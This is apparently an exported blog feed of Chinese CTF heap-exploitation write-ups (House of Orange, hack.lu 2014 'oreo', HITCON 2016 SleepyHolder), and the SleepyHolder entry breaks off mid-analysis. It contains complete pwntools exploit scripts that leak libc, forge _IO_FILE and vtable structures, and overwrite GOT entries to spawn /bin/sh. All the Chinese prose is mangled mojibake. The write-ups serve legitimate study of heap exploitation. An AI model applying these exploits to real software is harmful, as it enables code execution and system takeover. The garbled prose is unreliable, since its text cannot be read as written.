ä¸ºæˆ‘ä»¬å¾ˆéš¾æŽ§åˆ¶main_arenaä¸­çš„æ•°æ®ï¼Œå¹¶ä¸èƒ½åœ¨modeã€_IO_write_ptrå’Œ_IO_write_baseçš„å¯¹åº”åç§»å¤„æž„é€ å‡ºåˆé€‚çš„å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬å°†ç›®å…‰è½¬å‘_IO_FILEçš„é“¾è¡¨ç‰¹æ€§ã€‚åœ¨å‰æ–‡_IO_flush_all_lockpå‡½æ•°çš„ä»£ç æœ€åŽï¼Œå¯ä»¥å‘çŽ°ç¨‹åºé€šè¿‡fp = fp-&gt;_chainä¸æ–­çš„å¯»æ‰¾ä¸‹ä¸€ä¸ª_IO_FILEã€‚æ‰€ä»¥å¦‚æžœå¯ä»¥ä¿®æ”¹fp-&gt;_chainåˆ°ä¸€ä¸ªæˆ‘ä»¬ä¼ªé€ å¥½çš„_IO_FILEçš„åœ°å€ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸå®žçŽ°åˆ©ç”¨äº†ã€‚å·§å¦™çš„æ˜¯ï¼Œ_IO_FILEç»“æž„ä¸­çš„chianå­—æ®µå¯¹åº”åç§»æ˜¯0x68ï¼Œè€Œåœ¨&amp;main_arena+88å¯¹åº”åç§»ä¸º0x68çš„åœ°å€æ­£å¥½æ˜¯å¤§å°ä¸º0x60çš„small binçš„bkï¼Œè€Œè¿™ä¸ªåœ°å€çš„åˆšå¥½æ˜¯æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶çš„ã€‚1234567891011121314151617+0x00 [ top | last_remainder ]+0x10 [ unsorted bin fd | unsorted bin bk ]+0x20 [ smallbin 0x20 fd | smallbin 0x20 bk ]+0x30 [ smallbin 0x30 fd | smallbin 0x30 bk ]+0x40 [ smallbin 0x40 fd | smallbin 0x40 bk ]+0x50 [ smallbin 0x50 fd | smallbin 0x50 bk ]+0x60 [ smallbin 0x60 fd | smallbin 0x60 bk ]pwndbg&gt; x/64gx _IO_list_all0x7fdd7442c7b8 &lt;main_arena+88&gt;: 0x00005616d200b010 0x00005616d1fe94f00x7fdd7442c7c8 &lt;main_arena+104&gt;: 0x00005616d1fe94f0 0x00007fdd7442d1900x7fdd7442c7d8 &lt;main_arena+120&gt;: 0x00007fdd7442c7c8 0x00007fdd7442c7c80x7fdd7442c7e8 &lt;main_arena+136&gt;: 0x00007fdd7442c7d8 0x00007fdd7442c7d80x7fdd7442c7f8 &lt;main_arena+152&gt;: 0x00007fdd7442c7e8 0x00007fdd7442c7e80x7fdd7442c808 &lt;main_arena+168&gt;: 0x00007fdd7442c7f8 0x00007fdd7442c7f80x7fdd7442c818 &lt;main_arena+184&gt;: 0x00005616d1fe94f0 0x00005616d1fe94f0 &lt;== æ­¤å¤„0x7fdd7442c828 &lt;main_arena+200&gt;: 0x00007fdd7442c818 0x00007fdd7442c818æˆ‘ä»¬å¦‚æžœé€šè¿‡æº¢å‡ºï¼Œå°†ä½äºŽunsorted binä¸­çš„chunkçš„sizeä¿®æ”¹ä¸º0x60ã€‚ï¼ˆæ³¨ï¼šçŽ°åœ¨unsorted binä¸­çš„chunkå°±æ˜¯ä¹‹å‰è¢«é‡Šæ”¾çš„top chunkçš„ä¸€éƒ¨åˆ†ï¼‰é‚£ä¹ˆåœ¨ä¸‹ä¸€æ¬¡mallocçš„æ—¶å€™ï¼Œå› ä¸ºåœ¨å…¶ä»–binä¸­éƒ½æ²¡æœ‰åˆé€‚çš„chunkï¼Œmallocå°†ä¼šè¿›å…¥å¤§å¾ªçŽ¯ï¼ŒæŠŠunsorted binä¸­çš„chunkæ”¾å›žåˆ°å¯¹åº”çš„small binæˆ–large binä¸­ï¼ˆå…·ä½“æµç¨‹å‚è€ƒctfwikiï¼‰å› æ­¤ï¼Œæˆ‘ä»¬ä¿®æ”¹è¿‡sizeçš„chunkå°±ä¼šè¢«æ”¾å…¥å¤§å°ä¸º0x60çš„small binä¸­ï¼ŒåŒæ—¶ï¼Œè¯¥small binçš„fdå’Œbkéƒ½ä¼šå˜ä¸ºæ­¤chunkçš„åœ°å€ã€‚è¿™æ ·ï¼Œå½“_IO_flush_all_lockpå‡½æ•°é€šè¿‡fp-&gt;_chainå¯»æ‰¾ä¸‹ä¸€ä¸ª_IO_FILEæ—¶ï¼Œå°±ä¼šå¯»æ‰¾åˆ°smallbin 0x60ä¸­çš„chunkã€‚åªè¦åœ¨è¿™ä¸ªchunkä¸­ä¼ªé€ å¥½_IO_FILEç»“æž„ä½“ä»¥åŠvtableï¼ŒæŠŠ_IO_OVERFLOWè®¾ç½®ä¸ºsystemï¼Œç„¶åŽå°±å¯ä»¥æˆåŠŸgetshelläº†ã€‚åˆ©ç”¨è¿‡ç¨‹ç›´æŽ¥æž„é€ payloadé¦–å…ˆæ˜¯paddingï¼ŒæŠµè¾¾è¢«é‡Šæ”¾æŽ‰çš„top chunkã€‚1payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0)æŽ¥ä¸‹æ¥æž„é€ çš„å†…å­˜å…·æœ‰åŒé‡èº«ä»½ï¼Œä¸€æ˜¯ä½œä¸ºä¼ªé€ çš„_IO_FILEï¼›ä¸€æ˜¯ç”¨äºŽunsorted attackçš„victim chunkï¼Œå› ä¸ºå®ƒä½äºŽunsorted binä¸­ã€‚ç„¶åŽå¼€å§‹æž„é€ _IO_FILEã€‚å› ä¸ºè¦è°ƒç”¨çš„_IO_OVERFLOW (fp, EOF)è¢«ä¿®æ”¹åŽä¸ºsystem(fp)ï¼Œæ‰€ä»¥åœ¨å¼€å¤´å†™å…¥&#39;/bin/sh\x00&#39;ï¼Œè®©fp = &quot;/bin/sh&quot;ï¼›åˆå› ä¸ºä¸ºäº†å°†è¿™ä¸ªchunkæ”¾å…¥smallbin 0x60ï¼Œæ‰€ä»¥å°†sizeä½è®¾ç½®ä¸º0x61ã€‚1fake_file = '/bin/sh\x00' + p64(0x61)ç„¶åŽå°†bkçš„ä½ç½®å†™å…¥(IO_list_all - 0x10ï¼Œç”¨ä½œunsorted attack1fake_file += p64(0) + p64(IO_list_all - 0x10)æŽ¥ä¸‹æ¥çš„ä½ç½®åˆšå¥½æ˜¯_IO_write_baseå’ŒIO_write_ptrã€‚å‰é¢æåˆ°è¿‡éœ€è¦æž„é€ fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base1fake_file += p64(0) + p64(1) #_IO_write_base ; _IO_write_ptræŽ¥ä¸‹æ¥éœ€è¦ä¸€æ®µpaddingï¼Œç›´è‡³fp-&gt;mode1fake_file = fake_file.ljust(0xc0, '\x00') #paddingæŠµè¾¾fp-&gt;modeï¼Œæž„é€ fp-&gt;_mode &lt;= 01fake_file += p64(0) #mode &lt;= 0ç„¶åŽéœ€è¦è®¾ç½®vtableæŒ‡é’ˆï¼Œå°†å®ƒè®¾ç½®åˆ°å½“å‰åœ°å€ç›¸é‚»å¾€åŽçš„åœ°å€ï¼Œç„¶åŽç»§ç»­åœ¨åŽé¢æž„é€ vtableå°±è¡Œäº†123payload += fake_filepayload += p64(0) + p64(0) #paddingpayload += p64(heap_addr + 0x5d0) #vtableæŒ‡é’ˆæž„é€ vtable12payload += p64(0)*3 #vtablepayload += p64(system) #å°†__overflowæ”¹ä¸ºsystemå†™å…¥æ•°æ®1upgrade(0x800, payload)è§¦å‘æ¼æ´ž12p.recvuntil('Your choice : ')p.sendline('1')è°ƒç”¨buildå‡½æ•°ï¼Œç”±æœ€åˆçš„åˆ†æžå¯çŸ¥ï¼Œæ­¤å¤„ä¼šç”³è¯·3ä¸ªchunkã€‚ç”³è¯·ç¬¬ä¸€ä¸ªchunkæ—¶ï¼Œå¤§å°ä¸º0x20ï¼Œå› ä¸ºfastbinä¸­æ²¡æœ‰chunkï¼Œæ‰€ä»¥ä¼šè¿›å…¥å¤§å¾ªçŽ¯ï¼Œå°†æˆ‘ä»¬å‰é¢æž„é€ å¥½çš„chunkæ”¾å…¥smallbin 0x60ã€‚åœ¨ä»Žunsorted binä¸­å–å‡ºè¿™ä¸ªchunkæ—¶ï¼Œåˆä¼šè§¦å‘unsortedbin attackï¼Œæ”¹å†™_IO_list_allæŒ‡é’ˆã€‚è‡³æ­¤ï¼Œæ‰€æœ‰æ•°æ®éƒ½å¸ƒç½®å¥½äº†ã€‚å› ä¸ºunsortedbin attackçš„æ—¶å€™ç ´åäº†unsorted binçš„é“¾è¡¨ç»“æž„ï¼Œæ‰€ä»¥æŽ¥ä¸‹æ¥çš„åˆ†é…è¿‡ç¨‹ä¼šå‡ºçŽ°é”™è¯¯ï¼Œç³»ç»Ÿè°ƒç”¨malloc_printerråŽ»æ‰“å°é”™è¯¯ä¿¡æ¯ï¼Œä»Žè€Œè¢«æˆ‘ä»¬åŠ«æŒæµç¨‹ï¼Œæ‰§è¡Œåˆ°systemå‡½æ•°ã€‚EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#-*- coding:utf-8 -*-from pwn import *context.terminal = ['gnome-terminal', '-x', 'bash', '-c']p = process('./house_of_orange')elf = ELF('./house_of_orange')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def build(size, name): p.recvuntil('Your choice : ') p.sendline('1') p.recvuntil('Length of name :') p.sendline(str(size)) p.recvuntil('Name :') p.send(name) p.recvuntil('Price of Orange:') p.sendline('8') p.recvuntil('Color of Orange:') p.sendline('1')def see(): p.recvuntil('Your choice : ') p.sendline('2')def upgrade(size, name): p.recvuntil('Your choice : ') p.sendline('3') p.recvuntil('Length of name :') p.sendline(str(size)) p.recvuntil('Name:') p.send(name) p.recvuntil('Price of Orange: ') p.sendline('8') p.recvuntil('Color of Orange: ') p.sendline('1')build(0x10, 'aaaa')payload = 'a'*0x18 + p64(0x21) + p64(0)*3 + p64(0xfa1)upgrade(0x100, payload)#å°†topchunkæ”¾å…¥unsortedbinbuild(0x1000, 'aaaa')#ä»Žunsortedbinä¸­å–å‡ºä¸€éƒ¨åˆ†topchunkbuild(0x400, 'a'*0x8)see()p.recvuntil('aaaaaaaa')libc_base = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0x3C2DC8print "libc_base : %#x" % libc_base upgrade(0x400, 'a'*0x10)see()p.recvuntil('a'*0x10)heap_addr = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0xc0print "heap_addr : %#x" % heap_addrsystem = libc_base + libc.symbols['system']IO_list_all = libc_base + libc.symbols['_IO_list_all']print "system : %#x" % systemprint "_IO_list_all : %#x" % IO_list_allpayload = 'a' * 0x400 #paddingpayload += p64(0) + p64(0x21) #paddingpayload += p32(1) + p32(0x1f) + p64(0) #paddingfake_file = '/bin/sh\x00' + p64(0x61) # fp; sizefake_file += p64(0) + p64(IO_list_all - 0x10) # fd; bkfake_file += p64(0) + p64(1) # _IO_write_base ; _IO_write_ptrfake_file = fake_file.ljust(0xc0, '\x00') #paddingfake_file += p64(0) # mode &lt;= 0payload += fake_filepayload += p64(0) + p64(0) #paddingpayload += p64(heap_addr + 0x5d0) #vtableæŒ‡é’ˆpayload += p64(0)*3 # vtablepayload += p64(system) # å°†__overflowæ”¹ä¸ºsystemupgrade(0x800, payload)gdb.attach(p)p.recvuntil('Your choice : ')p.sendline('1')p.interactive()ç¨‹åºé“¾æŽ¥house of orangeåŽè®°è¿™ç¯‡æ–‡ç« å†™å¾—æ˜¯çœŸçš„ä¹±233333åœ¨å†™å¥½expåŽï¼Œè¿è¡Œæœ€åŽä¼šæŠ¥memory corruptionï¼Œæˆ‘è¿˜ä»¥ä¸ºå‡ºé”™äº†ï¼Œåˆè°ƒäº†åŠå¤©_(:Ð·ã‚âˆ )_ï¼Œæœ€åŽæ‰ååº”è¿‡æ¥ç¨‹åºæœ¬æ¥å°±è¦è°ƒç”¨malloc_printerrã€‚ã€‚ã€‚é»˜é»˜è¾“äº†ä¸ªlsï¼Œçœ‹åˆ°å›žæ˜¾æ„ŸåŠ¨å¾—ä¸€åŒ¹ã€‚è¯è¯´è¿™expæœ‰ä¸€å®šæ¦‚çŽ‡ä¼šå¤±è´¥ï¼Œå¹¶ä¸æ¸…æ¥šåŽŸå› _(:Ð·ã‚âˆ )_ã€‚]]></content>
      <categories>
        <category>å †åˆ©ç”¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å †åˆ©ç”¨</tag>
        <tag>IO_FILE</tag>
        <tag>house_of_orange</tag>
        <tag>unsortedbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hack.lu2014-oreo writeup]]></title>
    <url>%2Fpost%2F1b661c73.html</url>
    <content type="text"><![CDATA[é¢˜ç›®æè¿°é¢˜ç›®æ¥æºï¼šhack.lu CTF 2014çŸ¥è¯†ç‚¹ï¼šhouse of spiritæŒºè€çš„ä¸€é“é¢˜ç›®äº†ï¼Œä¸è¿‡æ˜¯how2heapå’Œctfwikiä¸Šçš„ä¾‹é¢˜ã€‚é¢˜ç›®æ˜¯ä¸€ä¸ªä¹°å–æžªæ”¯çš„ç³»ç»Ÿï¼ŒåŒæ ·æ˜¯å¸¸è§„çš„å¢žåˆ æŸ¥æ”¹ï¼Œ32ä½ç¨‹åºã€‚12345678910Welcome to the OREO Original Rifle Ecommerce Online System!What would you like to do?1. Add new rifle2. Show added rifles3. Order selected rifles4. Leave a Message with your Order5. Show current stats6. Exit!Action:ä¿æŠ¤å¦‚ä¸‹ï¼š123456[*] &apos;/home/nick/pwn_learn/heapLearn/house_of_spirit/hack-lu2014_oreo&apos; Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIEç¨‹åºæ¦‚å†µaddå‡½æ•°ï¼š12345678910111213v1 = head;head = (char *)malloc(56u);if ( head )&#123; *((_DWORD *)head + 13) = v1; printf("Rifle name: "); fgets(head + 25, 56, stdin); sub_80485EC(head + 25); printf("Rifle description: "); fgets(head, 56, stdin); sub_80485EC(head); ++cnt;&#125;å‡½æ•°ä¼šè¯»å–åç§°å’Œæè¿°ï¼Œå¹¶å°†åç§°ã€æè¿°ä»¥åŠä¸Šä¸€ä¸ªæžªæ”¯çš„åœ°å€ä¸€èµ·å­˜å…¥ç»“æž„ä½“ä¸­ï¼Œæž„æˆä¸€ä¸ªé“¾è¡¨ç»“æž„ã€‚ç»“æž„ä½“å¦‚ä¸‹ï¼š1234500000000 rifle struc ; (sizeof=0x38, mappedto_5)00000000 description db 25 dup(?)00000019 name db 27 dup(?)00000034 next dd ?00000038 rifle endsåŒæ—¶æ³¨æ„åˆ°ï¼Œfgetså‡½æ•°è¯»å–çš„é•¿åº¦ä¸º56ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å¯ä»¥å‘ç”Ÿæº¢å‡ºã€‚showå‡½æ•°ï¼š123456for ( i = head; i; i = (rifle *)i-&gt;next )&#123; printf("Name: %s\n", i-&gt;name); printf("Description: %s\n", i); puts("===================================");&#125;é€šè¿‡é“¾è¡¨ä¾æ¬¡è®¿é—®æ¯ä¸ªæžªæ”¯ï¼Œè¾“å‡ºåç§°å’Œæè¿°ã€‚Freeå‡½æ•°(Order)ï¼šéåŽ†é“¾è¡¨ï¼Œä¾æ¬¡å°†æ‰€æœ‰æžªæ”¯éƒ½freeæŽ‰ï¼Œç„¶åŽå°†é“¾è¡¨å¤´ç½®0messageå‡½æ•°ï¼šå‘dword_804A2A8æŒ‡å‘çš„åœ°å€å†™å…¥å­—ç¬¦ä¸²ã€‚è€Œåœ¨ç¨‹åºå¼€å¤´dword_804A2A8 = (char *)&amp;unk_804A2C0;ï¼Œæ‰€ä»¥æ˜¯å‘unk_804A2C0å¤„å†™å…¥ã€‚1234567.bss:0804A2A8 dword_804A2A8 dd ? ; DATA XREF: leave_message+23â†‘r.bss:0804A2A8 ; leave_message+3Câ†‘r ....bss:0804A2AC align 20h.bss:0804A2C0 unk_804A2C0 db ? ; ; DATA XREF: main+29â†‘o.bss:0804A2C1 db ? ;.bss:0804A2C2 db ? ;.bss:0804A2C3 db ? ;æ¼æ´žåˆ†æžæ³„éœ²libcåŸºå€å› ä¸ºç¨‹åºé€šè¿‡é“¾è¡¨æ¥ç®¡ç†æžªæ”¯ï¼Œæ°å¥½åœ¨æžªæ”¯ç»“æž„ä½“ä¸­å­˜åœ¨æº¢å‡ºï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä»Žnameæº¢å‡ºåˆ°nextæŒ‡é’ˆï¼Œå°†nextä¿®æ”¹åˆ°ä»»æ„åœ°å€ï¼Œå†é€šè¿‡showå°±å¯ä»¥ä»»æ„åœ°å€è¯»äº†ã€‚è¿™é‡Œå¯ä»¥é€šè¿‡æ³„éœ²puts_got,ç„¶åŽé€šè¿‡åç§»æ¥ç®—å‡ºlibcåŸºå€ã€‚house of spiritå› ä¸ºå¯ä»¥æŽ§åˆ¶nextæŒ‡é’ˆï¼Œä¹Ÿå°±æ„å‘³ç€å¯ä»¥åœ¨ä»»æ„åœ°æ–¹freeï¼Œé‚£ä¹ˆå¯ä»¥æž„é€ house of spiritã€‚å¦‚æžœå¯ä»¥åœ¨massageæŒ‡é’ˆdword_804A2A8å¤„å¸ƒç½®å¥½ä¸€ä¸ªfake chunkç”¨äºŽç»•è¿‡freeçš„æ£€æŸ¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨æ­¤å¤„åˆ†é…ä¸€ä¸ªchunkï¼ŒmassageæŒ‡é’ˆå°†ä¼šè¢«æŽ§åˆ¶ï¼Œä»Žè€Œå®žçŽ°ä»»æ„åœ°å€å†™ã€‚æž„é€ fake chunkè‹¥è¦è®©dword_804A2A8åœ¨chunkå†…éƒ¨ï¼Œé¦–å…ˆéœ€è¦åœ¨å®ƒçš„ä¸Šæ–¹æž„é€ å‡ºè¿™ä¸ªchunkçš„sizeï¼Œå¯ä»¥å‘çŽ°ï¼Œåœ¨å¯¹æžªæ”¯è¿›è¡Œè®¡æ•°çš„cntå˜é‡åˆšå¥½åœ¨0x804A2A4çš„ä½ç½®ï¼Œæ‰€ä»¥åªéœ€è¦æ·»åŠ ä¸€å®šæ•°é‡çš„æžªæ”¯ï¼Œå°±å¯ä»¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„sizeã€‚12345678.bss:0804A2A0 dword_804A2A0 dd ? ; DATA XREF: Free+5Aâ†‘r.bss:0804A2A0 ; Free+62â†‘w ....bss:0804A2A4 cnt dd ? ; DATA XREF: add+C5â†‘r.bss:0804A2A4 ; add+CDâ†‘w ....bss:0804A2A8 ; char *dword_804A2A8.bss:0804A2A8 dword_804A2A8 dd ? ; DATA XREF: leave_message+23â†‘r.bss:0804A2A8 ; leave_message+3Câ†‘r ....bss:0804A2AC align 20hå› ä¸ºä¸€ä¸ªæžªæ”¯ç»“æž„ä½“çš„å¤§å°ä¸º0x38ï¼ŒåŠ ä¸Šchunk headeråŽçš„sizeå±žäºŽ0x40è¿™ä¸ªfast binï¼Œæ‰€ä»¥éœ€è¦å°†fake chunkçš„sizeè®¾ç½®ä¸º0x40ï¼Œä¹Ÿå°±æ˜¯æ·»åŠ 0x40ä¸ªæžªæ”¯ç„¶åŽéœ€è¦ç»•è¿‡å¯¹next chunkçš„æ£€æŸ¥ï¼Œé€šè¿‡å†™å…¥messageï¼Œå°†å¯¹åº”next chunkçš„sizeå’Œprevsizeéƒ½æž„é€ å¥½ã€‚ï¼ˆè¯¦è§expï¼‰æž„é€ å¥½åŽï¼š1234560x804a288: 0x00000000 0x00000000 0x00000000 0x000000000x804a298: 0x00000000 0x00000000 0x00000001 0x00000041 &lt;== size0x804a2a8: 0x0804a2c0 0x00000000 0x00000000 0x00000000 &lt;== messageæŒ‡é’ˆ0x804a2b8: 0x00000000 0x00000000 0x00000000 0x000000000x804a2c8: 0x00000000 0x00000000 0x00000000 0x000000000x804a2d8: 0x00000000 0x00000000 0x00000040 0x00000050 &lt;== prevsize sizeå®žçŽ°ä»»æ„åœ°å€å†™åœ¨fake chunkæž„é€ å¥½åŽï¼Œå°±å¯ä»¥å°†dword_804A2A8å†™å…¥nextæŒ‡é’ˆï¼Œç„¶åŽfreeï¼Œåœ¨messageæŒ‡é’ˆå¤„æž„é€ å¥½çš„fake chunkå°†ä¼šè¿›å…¥fast binã€‚é‡æ–°æ·»åŠ æžªæ”¯ï¼Œfake chunkå°†ä¼šä»Žbinsä¸­å–å‡ºï¼Œé€šè¿‡è®¾ç½®æžªæ”¯çš„descriptionï¼Œå°±å¯ä»¥ä¿®æ”¹massageæŒ‡é’ˆäº†ï¼Œæ­¤æ—¶åœ¨è°ƒç”¨messageå‡½æ•°å°±èƒ½å®žçŽ°ä»»æ„åœ°å€å†™æ³¨æ„ç¨‹åºä¸­æ²¡æœ‰setvbufï¼Œæ‰€ä»¥ä¸ä¼šåŠæ—¶çš„å›žæ˜¾æ•°æ®ï¼Œåœ¨ç¼–å†™expæ—¶æœ‰äº›æ—¶å€™ä¸ç”¨recvexp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./hack-lu2014_oreo')elf = ELF('./hack-lu2014_oreo')libc = ELF('/lib/i386-linux-gnu/libc-2.19.so')def add(name, description): p.sendline('1') p.sendline(name) p.sendline(description)def show(): p.sendline('2') p.recvuntil('=\n')def free(): p.sendline('3')def leaveMsg(msg): p.sendline('4') p.sendline(msg)def leak(addr): add('a'*27 + p32(addr), 'a') show() p.recvuntil('Description: ') p.recvuntil('Description: ') res = u32(p.recvuntil('\n', drop=True)[:4]) p.recvuntil('\n') return res#æ³„éœ²libclibc_base = leak(elf.got['puts']) - libc.symbols['puts']system = libc_base + libc.symbols['system']print "libc_base : %#x" % libc_baseprint "system : %#x" % system#æ·»åŠ 0x40ä¸ªæžªæ”¯ï¼Œæž„é€ sizeä½for _ in range(0x40-1): add('a', 'a')#å°†massageæŒ‡é’ˆçš„åœ°å€å†™åˆ°nextæŒ‡é’ˆä¸­add('a'*27 + p32(0x0804A2A8), 'a')#æž„é€ next chunkï¼Œå°†prevsizeè®¾ä¸º0x40ï¼Œsizeè®¾ä¸º0x50payload = '\x00'*0x20 + p32(0x40) + p32(0x50)leaveMsg(payload)#æŠŠfake chunkæ”¾å…¥fast binfree()p.recvuntil('Okay order submitted!\n')#é‡æ–°æŠŠfake chunkåˆ†é…å‡ºæ¥ï¼Œå¹¶åœ¨descriptionå†™å…¥strlen_gotï¼Œç›¸å½“äºŽå°†messageæŒ‡é’ˆæ”¹ä¸ºæŒ‡å‘strlençš„gotè¡¨add('a' ,p32(elf.got['strlen']))#å†™å…¥messageï¼Œç›¸å½“äºŽå‘strlen_gotä¸­å†™å…¥systemã€‚#å› ä¸ºåœ¨leaveMsgå‡½æ•°ä¸­ï¼Œfgetsä¹‹åŽå°±ä¼šè°ƒç”¨strlenï¼Œæ‰€ä»¥é¡ºä¾¿å°±å¯ä»¥getshelläº†#è¿™é‡Œä½¿ç”¨åˆ†å·æ˜¯å› ä¸ºlinuxå‘½ä»¤ä¸­å¯ä»¥ä½¿ç”¨';'æ¥åˆ†å‰²ä¸¤æ¡æŒ‡ä»¤ï¼Œæ‰€ä»¥è¿™é‡Œç›¸å½“äºŽæŠŠ/bin/shå½“åšç¬¬äºŒæ¡æ‰§è¡Œçš„æŒ‡ä»¤äº†ï¼Œè€Œç¬¬ä¸€ä¸ªp32(system)æ˜¯ä¸ªæ— æ•ˆæŒ‡ä»¤ç½¢äº†leaveMsg(p32(system) + ';/bin/sh')p.interactive()ç›¸å…³é“¾æŽ¥é¢˜ç›®é“¾æŽ¥ï¼šoreowriteupå‚è€ƒï¼šctfwiki]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>å †åˆ©ç”¨</tag>
        <tag>house_of_spirit</tag>
        <tag>ctfwiki</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2016-SleepyHolder writeup]]></title>
    <url>%2Fpost%2Fe99b1303.html</url>
    <content type="text"><![CDATA[é¢˜ç›®æè¿°é¢˜ç›®æ¥æºï¼šHITCON CTF 2016çŸ¥è¯†ç‚¹ï¼šunlinkã€double freeè¿™é“é¢˜æä¾›äº†3ä¸ªåŠŸèƒ½ï¼Œæ·»åŠ ç§˜å¯†ã€åˆ é™¤ç§˜å¯†ã€é‡å†™ç§˜å¯†ã€‚ç§˜å¯†åˆ†ä¸º3ç§ï¼šsmallã€bigã€hugeã€‚å…¶ä¸­hugeç§˜å¯†ä¸€æ—¦å†™å…¥å†ä¹Ÿä¸èƒ½æ”¹ä¹Ÿä¸èƒ½åˆ ã€‚é¢˜ç›®ä¸­æ²¡æœ‰æä¾›è¾“å‡ºç§˜å¯†çš„åŠŸèƒ½ã€‚123456Waking Sleepy Holder up ...Hey! Do you have any secret?I can help you to hold your secrets, and no one will be able to see it :)1.Keep secret2.Wipe secret3.Renew secretç¨‹åºä¿æŠ¤å¦‚ä¸‹123456[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/Hitcon2016_SleepyHolder/SleepyHolder&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIEç¨‹åºæ¦‚å†µkeepå‡½æ•°ï¼š1234What secret do you want to keep?1. Small secret2. Big secret3. Keep a huge secret and lock it foreveræ ¹æ®é€‰æ‹©ä¸åŒçš„secretç”³è¯·ä¸åŒå¤§å°çš„å†…å­˜ï¼Œåˆ†åˆ«æ˜¯40ã€4000ã€400000ä¸ªå­—èŠ‚ã€‚å…¶ä¸­æ¯ä¸ªå¤§å°çš„chunkåªèƒ½ç”³è¯·ä¸€æ¬¡ã€‚wipeå‡½æ•°ï¼š12345678910if ( v0 == 1 )&#123; free(buf); dword_6020E0 = 0;&#125;else if ( v0 == 2 )&#123; free(qword_6020C0); dword_6020D8 = 0;&#125;åªèƒ½åˆ é™¤smallå’Œbigä¸¤ç§secretã€‚freeä¹‹åŽæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œå­˜åœ¨double freeæ¼æ´žrenewå‡½æ•°ï¼šåŒæ ·åªèƒ½é‡å†™smallå’Œbigä¸¤ç§secretï¼Œå› ä¸ºä¼šæ£€æŸ¥æ˜¯å¦ä½¿ç”¨çš„æ ‡è®°ï¼Œæ‰€ä»¥ä¸èƒ½UAFæ¼æ´žåˆ†æždouble freeå› ä¸ºfreeä¹‹åŽæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œæ‰€ä»¥å¯ä»¥é€ æˆdouble freeæ¼æ´žã€‚è¿™é‡Œdouble freeå¯ä»¥ç”¨äºŽè¾…åŠ©unlinkã€‚ä¿®æ”¹inuseä½ä¾æ¬¡åˆ†é…smallå’Œbigä¸¤ä¸ªsecretï¼Œç„¶åŽé‡Šæ”¾æŽ‰small secretï¼Œsmall secretå°†è¿›å…¥fast binã€‚æ­¤æ—¶å†ç”³è¯·large secretã€‚ç”±äºŽè¿™æ˜¯ä¸€ä¸ªlarge chunkï¼Œä¼šå…ˆåˆ©ç”¨malloc_consolidateå¤„ç†fastbinä¸­çš„chunkï¼Œå°†èƒ½åˆå¹¶çš„chunkåˆå¹¶åŽæ”¾å…¥unsortedbinï¼Œä¸èƒ½åˆå¹¶çš„å°±ç›´æŽ¥æ”¾åˆ°unsortedbinï¼Œè¿™æ ·çš„ç›®çš„æ˜¯å‡å°‘å †ä¸­çš„ç¢Žç‰‡ã€‚æ‰€ä»¥small secretå°†ä¼šè¿›å…¥unsorted binï¼ŒäºŽæ­¤åŒæ—¶ï¼Œbig secretçš„inuseä½ä¹Ÿå°†ä¼šè¢«ç½®0ã€‚å†æ¬¡é‡Šæ”¾small secretã€‚å› ä¸ºä¹‹å‰é‡Šæ”¾çš„small secretå·²ç»ä¸åœ¨fast binä¸­ï¼Œæ‰€ä»¥æ­¤æ—¶ä¸ä¼šè¢«æ£€æµ‹åˆ°double freeã€‚ç”³è¯·small secretã€‚ä»Žfast binä¸­å–å›žsmall secretã€‚è¿™æ ·å°±è¾¾åˆ°äº†ä¿®æ”¹inuseä½çš„ç›®çš„unlinkå‰æçŸ¥è¯†ï¼šç”±äºŽå †å—çš„å¤ç”¨æœºåˆ¶ï¼Œå½“å‰ä¸€ä¸ªchunkè¿˜åœ¨è¢«ä½¿ç”¨æ—¶ï¼ŒåŽä¸€ä¸ªchunkçš„prevsizeæ˜¯å½’å±žäºŽå‰ä¸€chunkï¼Œä½œä¸ºå‰ä¸€ä¸ªchunkçš„æ•°æ®åŒºåŸŸã€‚ç¨‹åºä¸­ï¼Œsmall secretçš„å¤§å°ä¸º0x28ï¼Œåˆšå¥½å¯ä»¥åˆ©ç”¨åˆ°ä¸‹ä¸€ä¸ªchunkçš„prevsizeã€‚å¦‚ä¸‹ï¼š12345670x6032e0: 0x0000000000000000 0x0000000000000031 &lt;== small secret0x6032f0: 0x6161616161616161 0x61616161616161610x603300: 0x6161616161616161 0x61616161616161610x603310: **0x0a61616161616161** 0x0000000000000fb1 &lt;== big secret0x603320: 0x6262626262626262 0x62626262626262620x603330: 0x6262626262626262 0x62626262626262620x603340: 0x6262626262626262 0x000000000000000aæ‰€ä»¥å¯ä»¥é€šè¿‡double freeæ¥æ”¹å˜big secretçš„inuseä½ï¼Œåˆå¯ä»¥æŽ§åˆ¶big secretçš„prevsizeï¼Œä¸”å †æŒ‡é’ˆæ˜¯å…¨å±€å˜é‡ï¼Œå¯ä»¥æˆåŠŸå®žçŽ°unlinkã€‚æ¼æ´žåˆ©ç”¨æŒ‰ç…§å‰æ–‡æ–¹æ³•ä¿®æ”¹inuseä½åœ¨small secretæž„é€ 